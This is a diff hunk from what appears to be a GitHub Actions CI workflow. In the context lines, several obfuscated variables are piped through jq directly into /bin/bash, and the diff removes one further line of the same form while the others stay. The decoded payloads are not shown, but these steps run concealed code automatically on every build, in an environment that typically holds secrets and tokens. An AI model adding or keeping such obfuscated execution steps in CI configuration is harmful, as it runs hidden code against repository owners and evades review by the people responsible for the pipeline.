@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$ogi7" | jq -r .ioxx00 | /bin/bash
           printf '%s' "$axxn9" | jq -r .xpq0 | /bin/bash
           printf '%s' "$b64" | jq -r .l45641 | /bin/bash
-          echo $ddtgh14806 | jq -r .g9632 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
